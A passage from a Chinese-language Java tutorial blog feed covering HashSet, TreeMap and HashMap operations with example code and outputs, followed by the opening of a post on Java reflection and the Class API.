class="hljs-number">1213</span>);<br>        hs.add(<span class="hljs-number">567</span>);<br>        hs.add(<span class="hljs-number">654</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> it : hs)&#123;<br>            System.out.println(it);<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;===========================&quot;</span>);<br>        hs.remove(<span class="hljs-number">1213</span>);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> it : hs)&#123;<br>            System.out.println(it);<br>        &#125;<br><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-number">23</span><br><span class="hljs-number">567</span><br><span class="hljs-number">1213</span><br><span class="hljs-number">654</span><br>===========================<br><span class="hljs-number">23</span><br><span class="hljs-number">567</span><br><span class="hljs-number">654</span><br></code></pre></div></td></tr></table></figure><h5 id="2-2-3-判断元素是否存在"><a href="#2-2-3-判断元素是否存在" class="headerlink" title="2.2.3 判断元素是否存在"></a>2.2.3 判断元素是否存在</h5><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">HashSet&lt;Integer&gt; hs = <span class="hljs-keyword">new</span> HashSet&lt;&gt;();<br>        hs.add(<span class="hljs-number">23</span>);<br>        hs.add(<span class="hljs-number">23</span>);<br>        hs.add(<span class="hljs-number">1213</span>);<br>        hs.add(<span class="hljs-number">567</span>);<br>        hs.add(<span class="hljs-number">654</span>);<br>        System.out.println(hs.contains(<span class="hljs-number">567</span>));<br>        System.out.println(hs.contains(<span class="hljs-number">5672</span>));<br><br><span class="hljs-comment">//输出结果</span><br><span class="hljs-keyword">true</span><br><span class="hljs-keyword">false</span><br></code></pre></div></td></tr></table></figure><h4 id="2-3-LinkedHashSet"><a href="#2-3-LinkedHashSet" class="headerlink" title="2.3 LinkedHashSet"></a>2.3 LinkedHashSet</h4><h3 id="3-Queue"><a href="#3-Queue" class="headerlink" title="3.Queue"></a>3.Queue</h3><h4 id="3-1-LinkedList"><a href="#3-1-LinkedList" class="headerlink" title="3.1 LinkedList"></a>3.1 LinkedList</h4><h4 id="3-2-PriorityQueue"><a href="#3-2-PriorityQueue" class="headerlink" title="3.2 PriorityQueue"></a>3.2 PriorityQueue</h4><h2 id="2-Map"><a href="#2-Map" class="headerlink" title="2.Map"></a>2.Map</h2><figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ascii">       ┌───┐<br>       │Map│<br>       └───┘<br>         ▲<br>    ┌────┴─────┐<br>    │          │<br>┌───────┐ ┌─────────┐<br>│HashMap│ │SortedMap│<br>└───────┘ └─────────┘<br>               ▲<br>               │<br>          ┌─────────┐<br>          │ TreeMap │<br>          └─────────┘<br></code></pre></div></td></tr></table></figure><p><code>SortedMap</code>是接口，它的实现类是<code>TreeMap</code>。</p><h3 id="2-1-TreeMap"><a href="#2-1-TreeMap" class="headerlink" title="2.1 TreeMap"></a>2.1 TreeMap</h3><p><code>HashMap</code>是一种以空间换时间的映射表，它的实现原理决定了内部的Key是无序的，即遍历<code>HashMap</code>的Key时，其顺序是不可预测的（但每个Key都会遍历一次且仅遍历一次）。<code>SortedMap</code>保证遍历时以Key的顺序来进行排序。<code>String</code>默认按字母排序。</p><h4 id="2-1-1-添加元素"><a href="#2-1-1-添加元素" class="headerlink" title="2.1.1 添加元素"></a>2.1.1 添加元素</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">TreeMap&lt;String,Integer&gt; tm = <span class="hljs-keyword">new</span> TreeMap&lt;&gt;();<br>        tm.put(<span class="hljs-string">&quot;apre&quot;</span>,<span class="hljs-number">2</span>);<br>        tm.put(<span class="hljs-string">&quot;zfwe&quot;</span>,<span class="hljs-number">43</span>);<br>        tm.put(<span class="hljs-string">&quot;ret&quot;</span>,<span class="hljs-number">14</span>);<br>        tm.put(<span class="hljs-string">&quot;noetjr&quot;</span>,<span class="hljs-number">576</span>);<br>        tm.put(<span class="hljs-string">&quot;mweq&quot;</span>,<span class="hljs-number">789</span>);<br>        System.out.println(tm);<br><br><span class="hljs-comment">//输出结果</span><br>&#123;apre=<span class="hljs-number">2</span>, mweq=<span class="hljs-number">789</span>, noetjr=<span class="hljs-number">576</span>, ret=<span class="hljs-number">14</span>, zfwe=<span class="hljs-number">43</span>&#125;<br></code></pre></div></td></tr></table></figure><p>使用TreeMap时，放入的Key必须实现Comparable接口。String、Integer这些类已经实现了Comparable接口，因此可以直接作为Key使用。作为Value的对象则没有任何要求。如果作为Key的class没有实现Comparable接口，那么，必须在创建TreeMap时同时指定一个自定义排序算法</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Main</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        Map&lt;Person, Integer&gt; map = <span class="hljs-keyword">new</span> TreeMap&lt;&gt;(<span class="hljs-keyword">new</span> Comparator&lt;Person&gt;() &#123;<br>            <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(Person p1, Person p2)</span> </span>&#123;<br>                <span class="hljs-keyword">return</span> p1.name.compareTo(p2.name);<br>            &#125;<br>        &#125;);<br>        map.put(<span class="hljs-keyword">new</span> Person(<span class="hljs-string">&quot;Tom&quot;</span>), <span class="hljs-number">1</span>);<br>        map.put(<span class="hljs-keyword">new</span> Person(<span class="hljs-string">&quot;Bob&quot;</span>), <span class="hljs-number">2</span>);<br>        map.put(<span class="hljs-keyword">new</span> Person(<span class="hljs-string">&quot;Lily&quot;</span>), <span class="hljs-number">3</span>);<br>        <span class="hljs-keyword">for</span> (Person key : map.keySet()) &#123;<br>            System.out.println(key);<br>        &#125;<br>        <span class="hljs-comment">// &#123;Person: Bob&#125;, &#123;Person: Lily&#125;, &#123;Person: Tom&#125;</span><br>        System.out.println(map.get(<span class="hljs-keyword">new</span> Person(<span class="hljs-string">&quot;Bob&quot;</span>))); <span class="hljs-comment">// 2</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    Person(String name) &#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&#123;Person: &quot;</span> + name + <span class="hljs-string">&quot;&#125;&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>Comparator接口要求实现一个比较方法，它负责比较传入的两个元素a和b，如果a&lt;b，则返回负数，通常是-1，如果a==b，则返回0，如果a&gt;b，则返回正数，通常是1。TreeMap内部根据比较结果对Key进行排序。</p><p>其他方法的使用可以参考下面的<code>HashMap</code>。</p><h3 id="2-2-HashMap"><a href="#2-2-HashMap" class="headerlink" title="2.2 HashMap"></a>2.2 HashMap</h3><p>HashMap 是一个散列表，它存储的内容是键值对(key-value)映射。实现了 Map 接口，根据键的 HashCode 值存储数据，具有很快的访问速度，最多允许一条记录的键为 null，不支持线程同步。是无序的，即不会记录插入的顺序。HashMap 继承于AbstractMap，实现了 Map、Cloneable、java.io.Serializable 接口。HashMap 的 key 与 value 类型可以相同也可以不同。</p><p>HashMap 常用方法：</p><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">clear()</td><td align="center">删除 hashMap 中的所有键/值对</td></tr><tr><td align="center">clone()</td><td align="center">复制一份 hashMap</td></tr><tr><td align="center">isEmpty()</td><td align="center">判断 hashMap 是否为空</td></tr><tr><td align="center">size()</td><td align="center">计算 hashMap 中键/值对的数量</td></tr><tr><td align="center">put()</td><td align="center">将键/值对添加到 hashMap 中</td></tr><tr><td align="center">putAll()</td><td align="center">将所有键/值对添加到 hashMap 中</td></tr><tr><td align="center">putIfAbsent()</td><td align="center">如果 hashMap 中不存在指定的键，则将指定的键/值对插入到 hashMap 中。</td></tr><tr><td align="center">remove()</td><td align="center">删除 hashMap 中指定键 key 的映射关系</td></tr><tr><td align="center">containsKey()</td><td align="center">检查 hashMap 中是否存在指定的 key 对应的映射关系。</td></tr><tr><td align="center">containsValue()</td><td align="center">检查 hashMap 中是否存在指定的 value 对应的映射关系。</td></tr><tr><td align="center">replace()</td><td align="center">替换 hashMap 中是指定的 key 对应的 value。</td></tr><tr><td align="center">replaceAll()</td><td align="center">将 hashMap 中的所有映射关系替换成给定的函数所执行的结果。</td></tr><tr><td align="center">get()</td><td align="center">获取指定 key 对应对 value</td></tr><tr><td align="center">getOrDefault()</td><td align="center">获取指定 key 对应对 value，如果找不到 key ，则返回设置的默认值</td></tr><tr><td align="center">forEach()</td><td align="center">对 hashMap 中的每个映射执行指定的操作。</td></tr><tr><td align="center">entrySet()</td><td align="center">返回 hashMap 中所有映射项的集合集合视图。</td></tr><tr><td align="center">keySet()</td><td align="center">返回 hashMap 中所有 key 组成的集合视图。</td></tr><tr><td align="center">values()</td><td align="center">返回 hashMap 中存在的所有 value 值。</td></tr><tr><td align="center">merge()</td><td align="center">添加键值对到 hashMap 中</td></tr><tr><td align="center">compute()</td><td align="center">对 hashMap 中指定 key 的值进行重新计算</td></tr><tr><td align="center">computeIfAbsent()</td><td align="center">对 hashMap 中指定 key 的值进行重新计算，如果不存在这个 key，则添加到 hasMap 中</td></tr><tr><td align="center">computeIfPresent()</td><td align="center">对 hashMap 中指定 key 的值进行重新计算，前提是该 key 存在于 hashMap 中。</td></tr></tbody></table><h4 id="2-2-1-添加元素-1"><a href="#2-2-1-添加元素-1" class="headerlink" title="2.2.1 添加元素"></a>2.2.1 添加元素</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">HashMap&lt;Integer,String&gt; hm = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        hm.put(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;abc&quot;</span>);<br>        hm.put(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;defa&quot;</span>);<br>        hm.put(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;ghij&quot;</span>);<br>        hm.put(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;klim&quot;</span>);<br>        hm.put(<span class="hljs-number">5</span>,<span class="hljs-string">&quot;nopq&quot;</span>);<br>        System.out.println(hm);<br><br><span class="hljs-comment">//输出结果</span><br>&#123;<span class="hljs-number">1</span>=abc, <span class="hljs-number">2</span>=defa, <span class="hljs-number">3</span>=ghij, <span class="hljs-number">4</span>=klim, <span class="hljs-number">5</span>=nopq&#125;<br></code></pre></div></td></tr></table></figure><h4 id="2-2-2-删除元素-1"><a href="#2-2-2-删除元素-1" class="headerlink" title="2.2.2 删除元素"></a>2.2.2 删除元素</h4><p>使用 remove(key) 方法来删除 key 对应的键值对。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">HashMap&lt;Integer,String&gt; hm = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        hm.put(<span class="hljs-number">11</span>,<span class="hljs-string">&quot;abc&quot;</span>);<br>        hm.put(<span class="hljs-number">21</span>,<span class="hljs-string">&quot;defa&quot;</span>);<br>        hm.put(<span class="hljs-number">33</span>,<span class="hljs-string">&quot;ghij&quot;</span>);<br>        hm.put(<span class="hljs-number">44</span>,<span class="hljs-string">&quot;klim&quot;</span>);<br>        hm.put(<span class="hljs-number">55</span>,<span class="hljs-string">&quot;nopq&quot;</span>);<br>        System.out.println(hm);<br>        System.out.println(hm.remove(<span class="hljs-number">33</span>));<br>        System.out.println(hm);<br><br><span class="hljs-comment">//输出结果</span><br>&#123;<span class="hljs-number">33</span>=ghij, <span class="hljs-number">21</span>=defa, <span class="hljs-number">55</span>=nopq, <span class="hljs-number">11</span>=abc, <span class="hljs-number">44</span>=klim&#125;<br>ghij<br>&#123;<span class="hljs-number">21</span>=defa, <span class="hljs-number">55</span>=nopq, <span class="hljs-number">11</span>=abc, <span class="hljs-number">44</span>=klim&#125;<br></code></pre></div></td></tr></table></figure><h4 id="2-2-3-获取元素、获取key、获取value"><a href="#2-2-3-获取元素、获取key、获取value" class="headerlink" title="2.2.3 获取元素、获取key、获取value"></a>2.2.3 获取元素、获取key、获取value</h4><p>使用 get(key) 方法来获取 key 对应的 value。使用 keySet() 方法，获取 key。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//=================================================</span><br><span class="hljs-comment">//获取key</span><br>HashMap&lt;Integer,String&gt; hm = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        hm.put(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;abc&quot;</span>);<br>        hm.put(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;defa&quot;</span>);<br>        hm.put(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;ghij&quot;</span>);<br>        hm.put(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;klim&quot;</span>);<br>        hm.put(<span class="hljs-number">5</span>,<span class="hljs-string">&quot;nopq&quot;</span>);<br>        System.out.println(hm);<br>        Set&lt;Integer&gt; itt = hm.keySet();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> it :itt)&#123;<br>            System.out.println(it);<br>        &#125;<br><br><span class="hljs-comment">//输出结果</span><br>&#123;<span class="hljs-number">1</span>=abc, <span class="hljs-number">2</span>=defa, <span class="hljs-number">3</span>=ghij, <span class="hljs-number">4</span>=klim, <span class="hljs-number">5</span>=nopq&#125;<br><span class="hljs-number">1</span><br><span class="hljs-number">2</span><br><span class="hljs-number">3</span><br><span class="hljs-number">4</span><br><span class="hljs-number">5</span><br><br><br><br><br><span class="hljs-comment">//=================================================</span><br><span class="hljs-comment">//获取value</span><br>HashMap&lt;Integer,String&gt; hm = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        hm.put(<span class="hljs-number">1</span>,<span class="hljs-string">&quot;abc&quot;</span>);<br>        hm.put(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;defa&quot;</span>);<br>        hm.put(<span class="hljs-number">3</span>,<span class="hljs-string">&quot;ghij&quot;</span>);<br>        hm.put(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;klim&quot;</span>);<br>        hm.put(<span class="hljs-number">5</span>,<span class="hljs-string">&quot;nopq&quot;</span>);<br>        System.out.println(hm);<br>        Collection&lt;String&gt; itt = hm.values();<br>        <span class="hljs-keyword">for</span> (String it :itt)&#123;<br>            System.out.println(it);<br>        &#125;<br><br><span class="hljs-comment">//输出结果</span><br>&#123;<span class="hljs-number">1</span>=abc, <span class="hljs-number">2</span>=defa, <span class="hljs-number">3</span>=ghij, <span class="hljs-number">4</span>=klim, <span class="hljs-number">5</span>=nopq&#125;<br>abc<br>defa<br>ghij<br>klim<br>nopq<br><br><br><br><br><span class="hljs-comment">//=================================================</span><br><span class="hljs-comment">//通过key获取value</span><br>HashMap&lt;Integer,String&gt; hm = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        hm.put(<span class="hljs-number">11</span>,<span class="hljs-string">&quot;abc&quot;</span>);<br>        hm.put(<span class="hljs-number">21</span>,<span class="hljs-string">&quot;defa&quot;</span>);<br>        hm.put(<span class="hljs-number">33</span>,<span class="hljs-string">&quot;ghij&quot;</span>);<br>        hm.put(<span class="hljs-number">44</span>,<span class="hljs-string">&quot;klim&quot;</span>);<br>        hm.put(<span class="hljs-number">55</span>,<span class="hljs-string">&quot;nopq&quot;</span>);<br>        System.out.println(hm);<br>        System.out.println(hm.get(<span class="hljs-number">33</span>));<br><br><span class="hljs-comment">//输出结果</span><br>&#123;<span class="hljs-number">33</span>=ghij, <span class="hljs-number">21</span>=defa, <span class="hljs-number">55</span>=nopq, <span class="hljs-number">11</span>=abc, <span class="hljs-number">44</span>=klim&#125;<br>ghij<br></code></pre></div></td></tr></table></figure><h4 id="2-2-4-清空"><a href="#2-2-4-清空" class="headerlink" title="2.2.4 清空"></a>2.2.4 清空</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">HashMap&lt;Integer,String&gt; hm = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>        hm.put(<span class="hljs-number">11</span>,<span class="hljs-string">&quot;abc&quot;</span>);<br>        hm.put(<span class="hljs-number">21</span>,<span class="hljs-string">&quot;defa&quot;</span>);<br>        hm.put(<span class="hljs-number">33</span>,<span class="hljs-string">&quot;ghij&quot;</span>);<br>        hm.put(<span class="hljs-number">44</span>,<span class="hljs-string">&quot;klim&quot;</span>);<br>        hm.put(<span class="hljs-number">55</span>,<span class="hljs-string">&quot;nopq&quot;</span>);<br>        System.out.println(hm);<br>        hm.clear();<br>        System.out.println(hm);<br><br><span class="hljs-comment">//输出结果</span><br>&#123;<span class="hljs-number">33</span>=ghij, <span class="hljs-number">21</span>=defa, <span class="hljs-number">55</span>=nopq, <span class="hljs-number">11</span>=abc, <span class="hljs-number">44</span>=klim&#125;<br>&#123;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-4-LinkedHashMap"><a href="#2-4-LinkedHashMap" class="headerlink" title="2.4 LinkedHashMap"></a>2.4 LinkedHashMap</h3>]]></content>
    
    
    <categories>
      
      <category>JAVA</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JAVA基础学习-反射（一）</title>
    <link href="/2021/08/04/JAVA/JAVA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E5%8F%8D%E5%B0%84%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2021/08/04/JAVA/JAVA%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0-%E5%8F%8D%E5%B0%84%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>JAVA反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。要想解剖一个类，必须先要获取到该类的字节码文件对象。而解剖使用的就是Class类中的方法。所以先要获取到每一个字节码文件对应的Class类型的对象。反射就是把java类中的各种成分映射成一个个的Java对象。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>Class类，Class类也是一个实实在在的类，存在于JDK的java.lang包中。Class类的实例表示java应用运行时的类(class ans enum)或接口(interface and annotation)（每个java类运行时都在JVM里表现为一个class对象，可通过类名.class、类型.getClass()、Class.forName(“类名”)等方法获取class对象）。数组同样也被映射为为class 对象的一个类，所有具有相同元素类型和维数的数组都共享该 Class 对象。基本类型boolean，byte，char，short，int，long，float，double和关键字void同样表现为 class  对象。</p><h2 id="1-获取Class对象的方式"><a href="#1-获取Class对象的方式" class="headerlink" title="1.获取Class对象的方式"></a>1.获取Class对象的方式</h2><blockquote><ol><li>Class.forName(“全限定类名”); 将字节码文件加载进内存，返回Class对象。多用于配置文件，将类名定义在配置文件中。读取文件，加载类。</li></ol></blockquote><blockquote><ol start="2"><li>类名.class; 通过类名的属性class获取。多用于参数的传递。</li></ol></blockquote><blockquote><ol start="3"><li>对象.getClass(); getClass()方法在Object类中定义。用于获取对象字节码的方式。</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// 1.Class.forName(&quot;全类名&quot;);</span><br>Class cls1 = Class.forName(<span class="hljs-string">&quot;com.tothefor.Person&quot;</span>);<br>System.out.println(cls1);<br><span class="hljs-comment">// 2. 类名.class</span><br>Class cls2 = Person.class;<br>System.out.println(cls2);<br><span class="hljs-comment">// 3. 对象.getClass()</span><br>Person p = <span class="hljs-keyword">new</span> Person();<br>Class cls3 = p.getClass();<br>System.out.println(cls3);<br><br>System.out.println(cls1 == cls2 );<br>System.out.println(cls1 == cls3 );<br></code></pre></div></td></tr></table></figure><p><strong>同一个字节码文件(*.class)在一次程序运行过程中，只会被加载一次，不论通过哪一种方式获取的Class对象，都是同一个。</strong></p><h2 id="2-Class类"><a href="#2-Class类" class="headerlink" title="2.Class类"></a>2.Class类</h2><h3 id="2-1-获取类名"><a href="#2-1-获取类名" class="headerlink" title="2.1 获取类名"></a>2.1 获取类名</h3><p>在Java中，Class类与java.lang.reflect类库一起对反射技术进行了全力的支持。在反射包中，我们常用的类主要有Constructor类表示的是Class 对象所表示的类的构造方法，利用它可以在运行时动态创建对象、Field表示Class对象所表示的类的成员变量，通过它可以在运行时动态修改成员变量的属性值(包含private)、Method表示Class对象所表示的类的成员方法，通过它可以动态调用对象的方法(包含private)。</p><p>Class类的方法：</p><table><thead><tr><th align="center">方法名</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">forName()</td><td align="center">(1)获取Class对象的一个引用，但引用的类还没有加载(该类的第一个对象没有生成)就加载了这个类。(2)为了产生Class引用，forName()立即就进行了初始化。</td></tr><tr><td align="center">Object-getClass()</td><td align="center">获取Class对象的一个引用，返回表示该对象的实际类型的Class引用。</td></tr><tr><td align="center">getName()</td><td align="center">取全限定的类名(包括包名)，即类的完整名字。</td></tr><tr><td align="center">getSimpleName()</td><td align="center">获取类名(不包括包名)</td></tr><tr><td align="center">getCanonicalName()</td><td align="center">获取全限定的类名(包括包名)</td></tr><tr><td align="center">isInterface()</td><td align="center">判断Class对象是否是表示一个接口</td></tr><tr><td align="center">getInterfaces()</td><td align="center">返回Class对象数组，表示Class对象所引用的类所实现的所有接口。</td></tr><tr><td align="center">getSupercalss()</td><td align="center">返回Class对象，表示Class对象所引用的类所继承的直接基类。应用该方法可在运行时发现一个对象完整的继承结构。</td></tr><tr><td align="center">newInstance()</td><td align="center">返回一个Oject对象，是实现“虚拟构造器”的一种途径。使用该方法创建的类，必须带有无参的构造器。</td></tr><tr><td align="center">getFields()</td><td align="center">获得某个类的所有的公共（public）的字段，包括继承自父类的所有公共字段。 类似的还有getMethods和getConstructors。</td></tr><tr><td align="center">getDeclaredFields</td><td align="center">获得某个类的自己声明的字段，即包括public、private和proteced，默认但是不包括父类声明的任何字段。类似的还有getDeclaredMethods和getDeclaredConstructors。</td></tr></tbody></table><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.cry;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">I1</span> </span>&#123;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">I2</span> </span>&#123;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cell</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> mCellPublic;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Animal</span> <span class="hljs-keyword">extends</span>  <span class="hljs-title">Cell</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> 